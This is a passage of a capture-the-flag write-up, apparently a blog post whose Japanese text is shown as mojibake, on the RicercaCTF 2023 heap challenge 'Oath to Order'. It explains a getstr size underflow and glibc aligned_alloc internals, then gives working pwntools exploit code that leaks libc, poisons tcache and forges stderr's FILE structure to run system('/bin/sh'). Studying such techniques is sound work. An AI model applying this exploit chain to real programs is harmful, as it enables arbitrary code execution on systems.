---
title: "Oath to Order - RicercaCTF 2023"
emoji: "ğŸ‘€"
type: "tech"
topics:
  - "ctf"
  - "writeup"
  - "pwn"
  - "heap"
published: true
published_at: "2023-05-03 14:22"
---

# æ¦‚è¦
RicercaCTF 2023ã§å‡ºé¡Œã•ã‚ŒãŸã€ŒOath to Orderã€ã«ã¤ã„ã¦å¾©ç¿’ã—ãŸã®ã§ã¾ã¨ã‚ã¦ã¿ãŸã€‚

# source code
```c: main.c
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#define NOTE_LEN 10
#define MAX_SIZE 300

char* notes[NOTE_LEN];

void print(const char *msg) {
  write(STDOUT_FILENO, msg, strlen(msg));
}

void getstr(char *buf, unsigned size) {
  while (--size) {
    if (read(STDIN_FILENO, buf, sizeof(char)) != sizeof(char))
      exit(1);
    else if (*buf == '\n')
      break;
    buf++;
  }

  *buf = '\0';
}

unsigned getint(void) {
  char buf[0x10] = {};

  getstr(buf, sizeof(buf));
  return atoi(buf);
}

void create(void) {
  unsigned idx, size, alignment;

  print("index: ");
  if ((idx = getint()) >= NOTE_LEN) {
    print("invalid index\n");
    return;
  }

  print("size: ");
  if ((size = getint()) >= MAX_SIZE) {
    print("invalid size\n");
    return;
  }

  print("alignment: ");
  if ((alignment = getint()) >= MAX_SIZE) {
    print("invalid alignment\n");
    return;
  }

  notes[idx] = aligned_alloc(alignment, size);

  print("note: ");
  getstr(notes[idx], size);
}

void show(void) {
  unsigned idx;

  print("index: ");
  if ((idx = getint()) >= NOTE_LEN || !notes[idx]) {
    print("invalid index\n");
    return;
  }

  print(notes[idx]);
  print("\n");
}

int main(void) {
  while (1) {
    print("1. Create\n"
          "2. Show\n"
          "> ");

    switch (getint()) {
      case 1:
        create();
        break;
      case 2:
        show();
        break;
      default:
        exit(0);
    }
  }
}
```

# è„†å¼±æ€§
getstré–¢æ•°ã«è„†å¼±æ€§ãŒã‚ã‚‹ã€‚sizeã«0ã‚’æ¸¡ã™ã¨-1, -2, -3...ã¨ãªã‚‹ãŸã‚ã€ä»»æ„é•·ã®æ›¸ãè¾¼ã¿ã‚’è¡Œã†ã“ã¨ãŒã§ãã‚‹ã€‚
```c: main.c
void getstr(char *buf, unsigned size) {
  while (--size) {
    if (read(STDIN_FILENO, buf, sizeof(char)) != sizeof(char))
      exit(1);
    else if (*buf == '\n')
      break;
    buf++;
  }
```

# çŸ¥è­˜

## aligned_allocã«ã¤ã„ã¦
ä»Šå›ã®å•é¡Œã§ã¯ãƒ¡ãƒ¢ãƒªç¢ºä¿ã«aligned_allocãŒä½¿ã‚ã‚Œã¦ã„ã‚‹ã€‚ã“ã‚Œã¯__libc_memalignã®aliasã«ãªã£ã¦ã„ã‚‹ã€‚(ä»¥ä¸‹å‚ç…§)

https://elixir.bootlin.com/glibc/glibc-2.34/source/malloc/malloc.c#L3473

\__libc_memalignã¯ä»¥ä¸‹ã§å®šç¾©ã•ã‚Œã¦ã„ã‚‹ã€‚ã“ã‚ŒãŒå‘¼ã°ã‚Œã‚‹ã¨\__mid_memalignãŒå‘¼ã°ã‚Œã‚‹ã“ã¨ãŒåˆ†ã‹ã‚‹ã€‚

https://elixir.bootlin.com/glibc/glibc-2.34/source/malloc/malloc.c#L3405

ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’èª­ã‚€ã¨\__mid_memalignã¯ä»¥ä¸‹ã®ã‚ˆã†ã«å‹•ä½œã™ã‚‹ã“ã¨ãŒåˆ†ã‹ã‚‹ã€‚

- alignmentãŒMALLOC_ALIGNMENTä»¥ä¸‹ã ã£ãŸå ´åˆã¯__libc_mallocã‚’å‘¼ã¶
- ãã‚Œä»¥å¤–ã®å ´åˆã¯alignmentã‚’ä¸€ç•ªè¿‘ã„2ã®ç´¯ä¹—ã«åˆ‡ã‚Šä¸Šã’ã¦\_int_memalignã‚’å‘¼ã¶

\_int_memalignã®å®šç¾©ã¯ä»¥ä¸‹ã€‚

https://elixir.bootlin.com/glibc/glibc-2.34/source/malloc/malloc.c#L4826

ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’èª­ã‚€ã¨ä»¥ä¸‹ã®ã‚ˆã†ã«å‹•ä½œã™ã‚‹ã“ã¨ãŒåˆ†ã‹ã‚‹ã€‚
- nb(= request2size(bytes)) + alignment + MINSIZE(=0x20)åˆ†_int_mallocã§ãƒ¡ãƒ¢ãƒªã‚’ç¢ºä¿
- alignmentã«åˆã†ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’è¦‹ã¤ã‘ã‚‹
- ä½™ã£ãŸéƒ¨åˆ†ã‚’ **_int_freeã§é–‹æ”¾ã™ã‚‹** 

é‡è¦ãªã®ã¯aligned_allocã®ä¸­ã«\_int_freeã‚’å‘¼ã³å‡ºã™ãƒ‘ã‚¹ãŒã‚ã‚‹ã“ã¨ã€‚ä»Šå›ã®å•é¡Œãƒ•ã‚¡ã‚¤ãƒ«ã«ã¯freeé–¢æ•°ãŒç„¡ã„ãŸã‚ã“ã‚Œã‚’ä¸Šæ‰‹ãä½¿ã£ã¦libc baseã‚’leakã™ã‚‹ã€‚ã•ã‚‰ã«alignmentãŒMALLOC_ALIGNMENTä»¥ä¸‹ã®æ™‚ã«ã®ã¿ã€\__mid_memalignãŒ__libc_mallocã‚’å‘¼ã³å‡ºã™ã“ã¨ã‚‚é‡è¦ã€‚\__libc_mallocã®å®šç¾©ã¯ä»¥ä¸‹ã€‚

https://elixir.bootlin.com/glibc/glibc-2.34/source/malloc/malloc.c#L3173

3193è¡Œç›®ã«æ³¨ç›®ã€‚
```c: malloc/malloc.c#L3193
  MAYBE_INIT_TCACHE ();
```
MALLOC_INIT_TCACHEãƒã‚¯ãƒ­ã¯ä»¥ä¸‹ã®ã‚ˆã†ã«å®šç¾©ã•ã‚Œã¦ã„ã‚‹ã€‚
```#c: malloc/malloc.c#L3156
# define MAYBE_INIT_TCACHE() \
  if (__glibc_unlikely (tcache == NULL)) \
    tcache_init();
```
tcache_inité–¢æ•°ã®å®šç¾©ã¯ä»¥ä¸‹ã€‚

https://elixir.bootlin.com/glibc/glibc-2.34/source/malloc/malloc.c#L3121

ã“ã®é–¢æ•°ã¯åå‰é€šã‚Štcacheã®åˆæœŸåŒ–ã‚’è¡Œã†ã€‚sizeof(tcache_perthread_struct)ã‚’_int_mallocã§ç¢ºä¿ã—ã¦0åˆæœŸåŒ–ã—ã¦ã„ã‚‹ã€‚\__libc_mallocãŒå‘¼ã³å‡ºã•ã‚Œã‚‹ã®ã¯alignmentãŒMALLOC_ALIGNMENTä»¥ä¸‹ã®æ™‚ã®ã¿ã ã£ãŸã€‚ã“ã‚Œã‚’ä¸Šæ‰‹ãåˆ©ç”¨ã™ã‚‹ã“ã¨ã§ã€**ä»»æ„æ›¸ãè¾¼ã¿ãŒè¡Œãˆã‚‹chunkã®å¾Œã‚ã«tcacheã‚’é…ç½®ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã€‚** ã“ã‚Œã«ã‚ˆã‚Štcache-poisoningãŒç°¡å˜ã«è¡Œãˆã‚‹ã‚ˆã†ã«ãªã‚‹ã€‚

## _IO_FILE_plusæ§‹é€ ä½“
stderrã‚„stdoutã¯_IO_FILE_plusæ§‹é€ ä½“ã«ãªã£ã¦ã„ã‚‹ã€‚å®šç¾©ã¯ä»¥ä¸‹ã€‚

https://elixir.bootlin.com/glibc/glibc-2.34/source/libio/libioP.h#L324

_IO_jump_tæ§‹é€ ä½“ã®å®šç¾©ã¯ä»¥ä¸‹ã€‚

https://elixir.bootlin.com/glibc/glibc-2.34/source/libio/libioP.h#L293

vtableã‚’åˆ‡ã‚Šæ›¿ãˆã‚‹ã“ã¨ã§ä½¿ç”¨ã™ã‚‹é–¢æ•°ã‚’å¤‰ãˆã‚Œã‚‹ã‚ˆã†ã«ãªã£ã¦ã„ã‚‹ã€‚ãŸã ã—ã“ã®ã‚ˆã†ãªæ”»æ’ƒã®å¯¾ç­–ã¨ã—ã¦vtableãŒ__libc_IO_vtablesã‚»ã‚¯ã‚·ãƒ§ãƒ³å†…ã‹ç¢ºèªã™ã‚‹å‡¦ç†ãŒã‚ã‚‹ã€‚

FILEæ§‹é€ ä½“ã¯_IO_FILEæ§‹é€ ä½“ã®typedefã§ã€ä»¥ä¸‹ã§å®šç¾©ã•ã‚Œã¦ã„ã‚‹ã€‚

https://elixir.bootlin.com/glibc/glibc-2.34/source/libio/bits/types/struct_FILE.h#L49

82è¡Œç›®ã‹ã‚‰ã®éƒ¨åˆ†ãŒä»¥ä¸‹ã®ã‚ˆã†ã«ãªã£ã¦ãŠã‚Šã€IO_USE_OLD_IO_FILEãŒdefineã•ã‚Œã¦ã„ã‚‹å ´åˆã¯offsetä»¥é™ãŒ_IO_FILEæ§‹é€ ä½“ã®ãƒ¡ãƒ³ãƒã¨ã—ã¦è¿½åŠ ã•ã‚Œã‚‹ã‚ˆã†ã«ãªã£ã¦ã„ã‚‹ã€‚
```c: libio/genops.c#L82
#ifdef _IO_USE_OLD_IO_FILE
};

struct _IO_FILE_complete
{
  struct _IO_FILE _file;
#endif
  __off64_t _offset;
  /* Wide character stream stuff.  */
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data;
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
  size_t __pad5;
  int _mode;
  /* Make sure we don't get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
};
```

## FSOP in libc2.34
libc2.34ã‹ã‚‰\_malloc_hookã‚„\__free_hookãŒå‰Šé™¤ã•ã‚ŒãŸ[^1]ã®ã§ã€ã“ã‚Œã‚’one_gadgetã‚„systemé–¢æ•°ã«æ›¸ãå¤‰ãˆã¦shellã‚’èµ·å‹•ã™ã‚‹ã“ã¨ã¯ã§ããªã„ã€‚ãã“ã§FSOPã‚’ä½¿ã†æ–¹é‡ã§è¡Œãã€‚FSOPã§shellã‚’èµ·å‹•ã™ã‚‹æ‰‹æ³•ã¨ã—ã¦\_IO_str_overflowã‚’ç”¨ã„ã‚‹æ‰‹æ³•[^2]ãŒçŸ¥ã‚‰ã‚Œã¦ã„ã‚‹ãŒã€_s._allocatebufferã‚’mallocã«ç½®ãæ›ãˆã‚‹ãƒ‘ãƒƒãƒ[^3]ãŒé©ç”¨ã•ã‚ŒãŸã®ã§ã€ã“ã‚Œã‚‚ä½¿ã†ã“ã¨ãŒã§ããªã„ã€‚libc2.34ã§FSOPã«ã‚ˆã‚ŠPCã‚’å¥ªå–ã™ã‚‹æ–¹æ³•ã¨ã—ã¦_IO_wfile_jumps.\__overflowã‚’ç”¨ã„ã‚‹æ‰‹æ³•[^4]ãŒã‚ã‚‹ã€‚

_IO_wfile_jumps.\__overflowã¯_IO_wfile_overflowã«ãªã£ã¦ã„ã‚‹ã€‚å®šç¾©ã¯ä»¥ä¸‹ã€‚

https://elixir.bootlin.com/glibc/glibc-2.34/source/libio/wfileops.c#L407

422è¡Œç›®ã®ä»¥ä¸‹ã®å‡¦ç†ã‚’å®Ÿè¡Œã™ã‚‹ã®ãŒç›®æ¨™ã€‚
```c: libio/wfileops.c#L422
	  _IO_wdoallocbuf (f);
```

ã¾ãšãã‚‚ãã‚‚_IO_wfile_jumps.\__overflowã‚’å‘¼ã³å‡ºã™ãŸã‚ã«exitã‚’å‘¼ã³å‡ºã—ã¦æœ€çµ‚çš„ã«_IO_flush_all_lookupã‚’å‘¼ã³å‡ºã™å¿…è¦ãŒã‚ã‚‹ã€‚ã“ã®é–¢æ•°ã®å®šç¾©ã¯ä»¥ä¸‹ã€‚

https://elixir.bootlin.com/glibc/glibc-2.34/source/libio/genops.c#L684

ä»¥ä¸‹ã®éƒ¨åˆ†ã§vtable->\__overlfowã‚’å‘¼ã³å‡ºã™ã€‚
```c: /libio/genops.c#L701
      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
	   || (_IO_vtable_offset (fp) == 0
	       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
				    > fp->_wide_data->_IO_write_base))
	   )
	  && _IO_OVERFLOW (fp, EOF) == EOF)
```
\__overflowã‚’å‘¼ã³å‡ºã™ãŸã‚ã«ã¯ä»¥ä¸‹ã®ã„ãšã‚Œã‹ã®æ¡ä»¶ã‚’æº€ãŸã™å¿…è¦ãŒã‚ã‚‹ã€‚
```
- fp->_mode <= 0 ã‹ã¤ fp->_IO_write_ptr > fp->_IO_write_base
- fp->_mode > 0 ã‹ã¤ fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base
```
ã“ã®æ¡ä»¶ã‚’æº€ãŸã›ã°__overflowãŒå‘¼ã³å‡ºã•ã‚Œã‚‹ã€‚ç¬¬ä¸€å¼•æ•°ã«ã¯fpãŒæ¸¡ã•ã‚Œã‚‹ã€‚ã“ã®æ™‚ã«_IO_wfile_overflowã‚’å‘¼ã³å‡ºã™ãŸã‚ã€vtableã‚’&_IO_wfile_jumpsã«æ”¹ç«„ã™ã‚‹å¿…è¦ãŒã‚ã‚‹ã€‚ã“ã‚Œã§_IO_wfile_overflowãŒå‘¼ã³å‡ºã•ã‚Œã‚‹ã€‚æœ€çµ‚çš„ãªç›®æ¨™ã¯422è¡Œç›®ã®ä»¥ä¸‹ã®å‡¦ç†ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã ã£ãŸã€‚
```c: libio/wfileops.c#L422
	  _IO_wdoallocbuf (f);
```
ã“ã®å‡¦ç†ã«åˆ°é”ã™ã‚‹ãŸã‚ã«ä»¥ä¸‹ã®æ¡ä»¶ã‚’æº€ãŸã™å¿…è¦ãŒã‚ã‚‹ã€‚

```
- f->_flags & _IO_NO_WRITES(=0x8) == 0
- (f->_flags & _IO_CURRENTLY_PUTTING(=0x800)) == 0
- f->_wide_data->_IO_write_base == 0
```

ã“ã‚Œã§_IO_wdoallocbufãŒå‘¼ã³å‡ºã•ã‚Œã‚‹ã€‚ã“ã®é–¢æ•°ã®å®šç¾©ã¯ä»¥ä¸‹ã€‚

https://elixir.bootlin.com/glibc/glibc-2.34/source/libio/wgenops.c#L365

371è¡Œç›®ã®ä»¥ä¸‹ã®å‡¦ç†ã‚’å®Ÿè¡Œã™ã‚‹ã®ãŒç›®æ¨™ã€‚
```c: libio/wgenops.c#L371
    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)
```
ã“ã®éƒ¨åˆ†ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ä»¥ä¸‹ã®æ¡ä»¶ã‚’æº€ãŸã™å¿…è¦ãŒã‚ã‚‹ã€‚
```
- fp->_wide_data->_IO_buf_base == 0
- fp->_flags & _IO_UNBUFFERED(=0x0x0002) == 0
```
_IO_WDOALLOCATEãƒã‚¯ãƒ­ã®å®šç¾©ã¯é•·ã„ã®ã§è¼‰ã›ãªã„ã€‚æœ€çµ‚çš„ã«f->_wide_data->_wide_vtable->\__doallocateãŒå‘¼ã³å‡ºã•ã‚Œã‚‹ã€‚\_doallocateã‚’&systemã«ã—ã¦ã€fpã®å…ˆé ­ã«"/bin/sh"ã‚’ç½®ã‘ã°shellãŒèµ·å‹•ã§ãã‚‹ã€‚

# exploit
## å‰æº–å‚™
ç¹°ã‚Šè¿”ã—ä½¿ã†å‡¦ç†ã‚’é–¢æ•°ã¨ã—ã¦ã¾ã¨ã‚ã¦ãŠãã€‚
```python: exploit.py
def create(idx : hex, size: hex, align: hex, note: bytes):
    io.sendlineafter(b'> ', str(1).encode())
    io.sendlineafter(b'index: ', str(idx).encode())
    io.sendlineafter(b'size: ', str(size).encode())
    io.sendlineafter(b'alignment: ', str(align).encode())
    io.sendlineafter(b'note: ', note)

def show(idx: hex) -> bytes:
    io.sendlineafter(b'> ', str(2).encode())
    io.sendlineafter(b'index: ', str(idx).encode())
    return io.recvline()
```

## libc base leak
```python: exploit.py
# libc base leak
create(0, 0, 0xf0, b'a' * 0x10 + pack(0xf0) + pack(0x40)[:-1])
create(1, 0, 0, b'b' * 0x18 + pack(0xf1)[:-1])
create(2, 0xd0 - 8, 0, b'c')
libc_base = unpack(show(0).rstrip().ljust(8, b'\0')) - 0x219ce0
log.info('libc_base: %#016lx', libc_base)
```
exploitã‚’å‹•ã‹ã—ãªãŒã‚‰ç¢ºèªã—ã¦ã¿ã‚‹ã€‚(æ‰‹å…ƒã«glibc-2.34ãŒç„¡ã‹ã£ãŸã®ã§å‹•ã‹ã™ã¨ãã¯glibc-2.31ã‚’ç”¨ã„ã¦ã„ã‚‹ã€‚offsetãŒå¤‰ã‚ã‚‹ã‘ã©ã‚„ã£ã¦ã„ã‚‹ã“ã¨ã¯å¤‰ã‚ã‚‰ãªã„ã®ã§å•é¡Œãªã„)ã¾ãšä¸€ã¤ç›®ã®createã‚’å®Ÿè¡Œã™ã‚‹ã€‚aligned_allocã®å‘¼ã³å‡ºã—å¾Œã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚‹ã€‚nb(=0x20) + alignment(=0x100) + MINSIZE(=0x20)ãŒ_int_mallocã§ç¢ºä¿ã•ã‚Œã€alignmentã«åˆã†ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒè¿”ã•ã‚Œã‚‹ã€‚å‰ã¨å¾Œã‚ã®chunkã¯freeã•ã‚Œã¦ã„ã‚‹ã€‚ã“ã“ã§ç¢ºä¿ã•ã‚ŒãŸchunkã‚’ä»¥é™chunkAã¨å‘¼ã¶ã€‚

![0](https://storage.googleapis.com/zenn-user-upload/fc9c17321ad1-20230503.png)

ãã®å¾Œgetstré–¢æ•°ã®å®Ÿè¡Œã«ã‚ˆã‚Šfastbin(0x40)ã«å…¥ã£ã¦ã„ã‚‹chunkã®prev_sizeãŒ0xf0ã«ã€sizeãŒ0x40ã«æ›¸ãå¤‰ã‚ã‚‹ã€‚PREV_INUSEã‚’0ã«ã—ã¦ã„ã‚‹ã“ã¨ãŒãƒã‚¤ãƒ³ãƒˆã€‚

![1](https://storage.googleapis.com/zenn-user-upload/c01fbf6ff741-20230503.png)

æ¬¡ã«äºŒã¤ç›®ã®createã‚’å®Ÿè¡Œã™ã‚‹ã€‚aligned_allocã®å‘¼ã³å‡ºã—å¾Œã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚‹ã€‚

![2](https://storage.googleapis.com/zenn-user-upload/261a95910fe9-20230503.png)

alignementã¯0ãªã®ã§å…ˆã»ã©unsorted binã«å…¥ã£ã¦ã„ãŸchunkã‹ã‚‰åˆ‡ã‚Šå‡ºã•ã‚Œã‚‹ã€‚åˆ‡ã‚Šå‡ºã•ã‚ŒãŸå¾Œã®chunkã‚µã‚¤ã‚ºã¯0xf0 - 0x20 = 0xd0ã§ã‚ã‚Šã€unsorted binã«ç¹‹ãŒã‚‹ã€‚ã¾ãŸã€fastbinã«ã¤ãªãŒã£ã¦ã„ã‚‹chunkã®å¾Œã‚ã«0x290ãƒã‚¤ãƒˆã®chunkãŒç¢ºä¿ã•ã‚Œã¦ã„ã‚‹ã€‚ã“ã‚ŒãŒtcacheã€‚(sizeof(struct tcache_perthread_struct) = 0x280)

ãã®å¾Œgetstré–¢æ•°ã®å®Ÿè¡Œã«ã‚ˆã‚Šunsorted binã«å…¥ã£ã¦ã„ã‚‹chunkã®ã‚µã‚¤ã‚ºãŒ0xf0ã«æ›¸ãå¤‰ã‚ã‚‹ã€‚
ã²ã¨ã¤å‰ã®createã§fastbinã«å…¥ã£ã¦ã„ã‚‹chunkã®perev_sizeã‚’0xf0ã«ã€sizeã®PREV_INUSEã‚’0ã«ã—ã¦ã„ãŸã“ã¨ã‚’æ€ã„å‡ºã—ã¦ã»ã—ã„ã€‚ã“ã‚Œã«ã‚ˆã‚Š **unsorted binã«å…¥ã£ã¦ã„ãŸchunk(size=0xd0) + chunkA(size=0x20)ãŒä¸€ã¤ã®free chunkã¨ã—ã¦æ‰±ã‚ã‚Œã‚‹ã€‚** 

![3](https://storage.googleapis.com/zenn-user-upload/50d9741d7ab7-20230503.png)

æœ€å¾Œã«ä¸‰ã¤ç›®ã®createã‚’å®Ÿè¡Œã™ã‚‹ã€‚aligned_allocã®å‘¼ã³å‡ºã—å¾Œã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚‹ã€‚å‰ã®createã«ã‚ˆã£ã¦unsorted binã«å…ƒã€…å…¥ã£ã¦ã„ãŸchunk(size=0xd0)ã¨chunkA(size=0x20)ãŒä¸€ã¤ã®free chunkã¨ã—ã¦æ‰±ã‚ã‚Œã¦ã„ãŸã€‚ä¸‰ã¤ç›®ã®createã§è¦æ±‚ã—ã¦ã„ã‚‹ã‚µã‚¤ã‚ºã¯0xd0ãªã®ã§ã“ã‚ŒãŒfree chunkã‹ã‚‰åˆ‡ã‚Šå‡ºã•ã‚Œã€æ®‹ã‚Šã®éƒ¨åˆ†ã€å³ã¡ **chunkAãŒunsorted binã«ç¹‹ãŒã‚Œã‚‹ã€‚**

![4](https://storage.googleapis.com/zenn-user-upload/e2a57e131f36-20230503.png)

å¾Œã¯chunkA.fdã‚’èª­ã¿å‡ºã›ã°ãã“ã‹ã‚‰libc baseãŒè¨ˆç®—ã§ãã‚‹ã€‚

## FSOP
ä»Šheapã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã£ã¦ã„ã‚‹ã€‚

![4](https://storage.googleapis.com/zenn-user-upload/e326fd0e3d8d-20230503.png)

fastbinã«å…¥ã£ã¦ã„ã‚‹chunkã®å¾Œã‚ã«ã‚ã‚‹0x290ãƒã‚¤ãƒˆã¯tcacheã ã£ãŸã€‚ãã—ã¦ä»ŠchunkA(size = 0x20)ã¯unsorted binã«ç¹‹ãŒã£ã¦ã„ã‚‹ã€‚æ¬¡ã®aligned_allocã§chunkAã‚’å–ã‚Šå‡ºã™ã“ã¨ã§tcache-poisoningã‚’ç°¡å˜ã«è¡Œã†ã“ã¨ãŒã§ãã‚‹ã€‚ã‚„ã‚ŠãŸã„ã“ã¨ã¯stderrã‚’æ”¹ç«„ã—ã¦FSOPã«ã‚ˆã‚Šshellã‚’èµ·å‹•ã™ã‚‹ã“ã¨ã ã£ãŸã®ã§ã€tcache(0x20)ã«&_IO_2_1_stderr_ã‚’å…¥ã‚Œã‚‹ã€‚ãã®ãŸã‚ã®ã‚³ãƒ¼ãƒ‰ãŒä»¥ä¸‹ã€‚
```python: exploit.py
# FSOP
# fake tcache
stderr = libc_base + 0x21a6a0
tcache = p16(1)
tcache = tcache.ljust(0x80, b'\0')
tcache += pack(stderr)
create(3, 0, 0, b'\0' * 0x58 + pack(0x291) + tcache)
```
ã“ã®createã‚’å®Ÿè¡Œã™ã‚‹ã€‚aligned_allocã®å‘¼ã³å‡ºã—å¾Œã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚‹ã€‚chunkAãŒè¿”ã£ã¦ã„ã‚‹ã“ã¨ãŒåˆ†ã‹ã‚‹ã€‚

![5](https://storage.googleapis.com/zenn-user-upload/fa8d3904ff75-20230503.png)

ãã®å¾Œgetstré–¢æ•°ã®å®Ÿè¡Œã«ã‚ˆã‚Štcahce(0x20)ã«&_IO_2_1_stderr_ãŒå…¥ã‚‹ã€‚

![6](https://storage.googleapis.com/zenn-user-upload/4db0a28b4cdf-20230503.png)

æ¬¡ã®aligned_allocã§0x20ãƒã‚¤ãƒˆè¦æ±‚ã™ã‚Œã°ä»Štcache(0x20)ã«å…¥ã‚ŒãŸã‚¢ãƒ‰ãƒ¬ã‚¹ã€å³ã¡&_IO_2_1_stderr_ãŒè¿”ã‚‹ã®ã§_IO_2_1_stderr_ã‚’æ”¹ç«„ã§ãã‚‹ã€‚æº€ãŸã™ã¹ãæ¡ä»¶ã¯ä»¥ä¸‹ã ã£ãŸã€‚
```
- fp->_mode > 0 ã‹ã¤ fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base
- f->_flags & _IO_NO_WRITES(=0x8) == 0
- (f->_flags & _IO_CURRENTLY_PUTTING(=0x800)) == 0
- fp->_flags & _IO_UNBUFFERED(=0x0x0002) == 0
- f->_wide_data->_IO_write_base == 0
```
æ¡ä»¶ã‚’æº€ãŸã—ã¤ã¤shellã‚’èµ·å‹•ã™ã‚‹ãŸã‚ã«ã¯å„ãƒ¡ãƒ³ãƒã‚’ä»¥ä¸‹ã®ã‚ˆã†ã«ã‚»ãƒƒãƒˆã™ã‚Œã°ã‚ˆã„ã€‚
```
- stderr->_flags = "  /bin/sh\0"(å…ˆé ­ã«SP2å€‹)
- stderr->_mode = 1
- stderr->_wide_data = &_IO_2_1_stdout
- stderr->vtable = &_IO_wfile_jumps
- stderr->_wide_data->_IO_write_base == 0
- stderr->_wide_data->_IO_write_ptr = 1
- stderr->_wide_data->_wide_vtable = &_IO_2_1_stdout
- (struct _IO_jump_t *)stderr->__overflow = &system
```
stderrã®å…ˆé ­ã«ã¯"/bin/sh\0"ã‚’ç½®ãå¿…è¦ãŒã‚ã‚‹ãŒã“ã®éƒ¨åˆ†ã¯_flagsãªã®ã§æ¡ä»¶ã‚’æº€ãŸã™ãŸã‚ã«äºŒã¤ã®SP(=0x20)ã‚’ã„ã‚Œã¦ã„ã‚‹ã€‚stderr->_wide_dataã¨stderr->_wide_data->_wide_vtableã‚’&_IO_2_1_stdoutã«ã—ã¦ã„ã‚‹ã¨ã“ã‚ãŒãƒã‚¤ãƒ³ãƒˆã€‚_IO_2_1_stdoutã¯_IO_2_1_stderrã®ã™ãå¾Œã‚ã®é ˜åŸŸãªã®ã§ã“ã‚Œã«ã‚ˆã‚Šä¸€åº¦ã®æ›¸ãè¾¼ã¿ã§æ¸ˆã‚€ã€‚ã“ã‚ŒãŒä¸Šæ‰‹ãã„ãã®ã¯å•é¡Œãƒ•ã‚¡ã‚¤ãƒ«ã§å…¥å‡ºåŠ›ã«read/writeãŒä½¿ã‚ã‚Œã¦ã„ã‚‹ãŸã‚ã§ã‚ã‚‹ã“ã¨ã«æ³¨æ„ã€‚exploitã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚‹ã€‚
```python: exploit.py
stdout = stderr + 0xe0
system = libc_base + 0x50d60
wfile_jumps = libc_base + 0x2160c0

# fake _IO_FILE_plus struct
fake_file = b'  /bin/sh\0' # _flags
fake_file = fake_file.ljust(0xa0, b'\0')
fake_file += pack(stdout) # _wide_data
fake_file = fake_file.ljust(0xc0, b'\0')
fake_file += p32(1) # _mode
fake_file = fake_file.ljust(0xd8, b'\0')
fake_file += pack(wfile_jumps) # vtable

# fake _IO_wide_data & _IO_jump_t struct
fake_wide_data = pack(0) * 4
fake_wide_data += pack(1) # _IO_write_ptr
fake_wide_data = fake_wide_data.ljust(0x8 * 13, b'\0')
fake_wide_data += pack(system) # __doallocate
fake_wide_data = fake_wide_data.ljust(0xe0, b'\0')
fake_wide_data += pack(stdout)

create(4, 0, 0, fake_file + fake_wide_data)
```
ã“ã®createã‚’å®Ÿè¡Œã™ã‚‹ã€‚aligned_allocã®å‘¼ã³å‡ºã—ã«ã‚ˆã‚Š&_IO_2_1_stderrãŒè¿”ã‚‹ã€‚

![7](https://storage.googleapis.com/zenn-user-upload/d2971167dcee-20230503.png)

getstré–¢æ•°å®Ÿè¡Œå¾Œã®_IO_2_1_stderrä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚‹ã€‚

![8](https://storage.googleapis.com/zenn-user-upload/efa5a9c5ebbf-20230503.png)

_IO_2_1_stderr._wide_dataã¯&_IO_2_1_stdoutã«ãªã‚‹ã€‚ã“ã“ã‚’struct _IO_wide_dataã¨ã—ã¦è§£é‡ˆã™ã‚‹ã¨ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚‹ã€‚

![9](https://storage.googleapis.com/zenn-user-upload/bd259937752d-20230503.png)

_IO_2_1_stderr._wide_data._wide_vtableã‚‚&_IO_2_1_stdoutã«ãªã‚‹ã€‚ã“ã“ã‚’struct _IO_jumpt_tã¨ã—ã¦è§£é‡ˆã™ã‚‹ã¨ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚‹ã€‚

![10](https://storage.googleapis.com/zenn-user-upload/bb3e94b798af-20230503.png)

å„ãƒ¡ãƒ³ãƒã‚’ã†ã¾ãæ”¹ç«„ã§ãã¦ã„ã‚‹ã“ã¨ãŒåˆ†ã‹ã‚‹ã€‚å¾Œã¯exitã‚’å‘¼ã³å‡ºã›ã°ã‚ˆã„ã€‚
```python: expolit.py
io.sendlineafter(b'> ', b'3')
io.interactive()
```
ã“ã‚Œã‚’å®Ÿè¡Œã™ã‚‹ã¨ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚Šã€flagãŒã‚²ãƒƒãƒˆã§ãã‚‹ã€‚

![11](https://storage.googleapis.com/zenn-user-upload/3e8235b41845-20230503.png)


# è€ƒå¯Ÿ
ä»Šå›ã®exploitã§ã¯_IO_wfile_overflowãŒæœ€çµ‚çš„ã«f->_wide_data->_wide_vtable->\__doallocateã‚’å‘¼ã³å‡ºã™ã“ã¨ã‚’åˆ©ç”¨ã—ãŸã€‚\__doallocateã‚’å‘¼ã³å‡ºã—ã¦ã„ã‚‹ã®ã¯_IO_WDOALLOCATEãƒã‚¯ãƒ­ã ã£ãŸã€‚ã“ã®ãƒã‚¯ãƒ­ã¨é–¢é€£ã™ã‚‹ãƒã‚¯ãƒ­ã®å®šç¾©ã‚’ä»¥ä¸‹ã«ç¤ºã™ã€‚
```c: libio/libioP.h
#define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)
#define WJUMP0(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)->FUNC) (THIS)
#define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)
